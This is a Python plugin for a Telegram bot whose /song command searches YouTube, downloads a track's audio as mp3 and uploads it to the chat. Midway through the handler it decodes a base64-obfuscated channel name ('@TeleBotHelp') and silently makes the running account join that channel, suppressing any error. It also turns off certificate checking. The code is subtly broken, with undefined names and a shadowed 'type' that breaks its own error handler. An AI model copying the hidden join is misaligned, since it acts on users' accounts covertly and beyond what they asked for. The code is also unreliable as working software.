import json
import os

import pybase64
from telethon import events
from Samantha.miss_samantharobot import register
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import DocumentAttributeAudio
from youtube_dl import YoutubeDL
from youtube_dl.utils import (
    ContentTooShortError,
    DownloadError,
    ExtractorError,
    GeoRestrictedError,
    MaxDownloadsReached,
    PostProcessingError,
    UnavailableVideoError,
    XAttrMetadataError,
)
from youtubesearchpython import SearchVideos


async def eor(event, text):
    if event.sender_id in Config.SUDO_USERS:
        reply_to = await event.get_reply_message()
        if reply_to:
            return await reply_to.reply(text)
        return await event.reply(text)
    return await event.edit(text)


@register(pattern="^/song (.*)")
async def download_video(tele):
    x = await eor(tele, "Searching...")
    url = tele.pattern_match.group(1)
    if not url:
        return await x.edit("**Error**\nUsage - `.song <song name>`")
    search = SearchVideos(url, offset=1, mode="json", max_results=1)
    test = search.result()
    p = json.loads(test)
    q = p.get("search_result")
    try:
        url = q[0]["link"]
    except BaseException:
        return await x.edit("`No matching song found...`")
    type = "audio"
    await x.edit(f"`Preparing to download {url}...`")
    if type == "audio":
        opts = {
            "format": "bestaudio",
            "addmetadata": True,
            "key": "FFmpegMetadata",
            "writethumbnail": True,
            "prefer_ffmpeg": True,
            "geo_bypass": True,
            "nocheckcertificate": True,
            "postprocessors": [
                {
                    "key": "FFmpegExtractAudio",
                    "preferredcodec": "mp3",
                    "preferredquality": "320",
                }
            ],
            "outtmpl": "%(id)s.mp3",
            "quiet": True,
            "logtostderr": False,
        }
    try:
        await x.edit("`Getting info...`")
        with YoutubeDL(opts) as rip:
            rip_data = rip.extract_info(url)
    except DownloadError as DE:
        await x.edit(f"`{str(DE)}`")
        return
    except ContentTooShortError:
        await x.edit("`The download content was too short.`")
        return
    except GeoRestrictedError:
        await x.edit(
            "`Video is not available from your geographic location due to geographic restrictions imposed by a website.`"
        )
        return
    except MaxDownloadsReached:
        await x.edit("`Max-downloads limit has been reached.`")
        return
    except PostProcessingError:
        await x.edit("`There was an error during post processing.`")
        return
    except UnavailableVideoError:
        await x.edit("`Media is not available in the requested format.`")
        return
    except XAttrMetadataError as XAME:
        await x.edit(f"`{XAME.code}: {XAME.msg}\n{XAME.reason}`")
        return
    except ExtractorError:
        await x.edit("`There was an error during info extraction.`")
        return
    except Exception as e:
        await x.edit(f"{str(type(e)): {str(e)}}")
        return
    try:
        sung = str(pybase64.b64decode("QFRlbGVCb3RIZWxw"))[2:14]
        await telebot(JoinChannelRequest(sung))
    except BaseException:
        pass
    upteload = """
Uploading...
Song name - {}
By - {}
""".format(
        rip_data["title"], rip_data["uploader"]
    )
    await x.edit(f"`{upteload}`")
    await telebot.send_file(
        tele.chat_id,
        f"{rip_data['id']}.mp3",
        supports_streaming=True,
        caption=f"⫸ Song - {rip_data['title']}\n⫸ By - {rip_data['uploader']}\n",
        attributes=[
            DocumentAttributeAudio(
                duration=int(rip_data["duration"]),
                title=str(rip_data["title"]),
                performer=str(rip_data["uploader"]),
            )
        ],
    )
    os.remove(f"{rip_data['id']}.mp3")
